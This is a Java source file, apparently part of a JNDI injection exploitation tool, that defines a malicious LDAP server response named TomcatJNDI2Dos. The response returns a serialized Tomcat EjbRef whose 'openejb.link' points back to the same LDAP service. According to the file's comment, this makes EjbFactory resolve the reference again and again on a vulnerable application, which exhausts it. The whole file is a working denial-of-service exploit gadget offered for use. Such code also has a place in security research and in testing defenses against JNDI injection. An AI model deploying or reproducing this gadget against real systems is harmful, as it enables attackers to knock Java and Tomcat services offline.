package net.roboterh.injector.gadgets;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import net.roboterh.injector.utils.GadgetUtils;
import org.apache.naming.EjbRef;

import javax.naming.StringRefAddr;

/*
    TomcatJNDI2Dos Way:
    Requirement:
        Tomcat in classpath
    Explanation:
        1. `org.apache.naming.factory.EjbFactory#getObjectInstance`: trigger jndi injection by the value of `openejb.link`, result in dos vuln
 */
public class TomcatJNDI2Dos implements LDAPService{
    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String baseDN) {
        argsHandler(baseDN);
        generateHandler();

        System.out.println(this.getClass().getName() + "sendResult start.....");

        EjbRef ref = new EjbRef(null, null, null, null, "org.apache.naming.factory.EjbFactory", null);
        ref.add(new StringRefAddr("openejb.factory", "org.apache.naming.java.javaURLContextFactory"));
        ref.add(new StringRefAddr("openejb.link", "ldap://127.0.0.1:1389/TomcatJNDI2Dos/test"));

        Entry entry = new Entry(baseDN);
        entry.addAttribute("javaClassName", "java.lang.Class");
        entry.addAttribute("javaSerializedData", GadgetUtils.serialize(ref));
        try {
            result.sendSearchEntry(entry);
        } catch (LDAPException e) {
            throw new RuntimeException(e);
        }
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void argsHandler(String baseDN) {

    }

    @Override
    public void generateHandler() {

    }
}
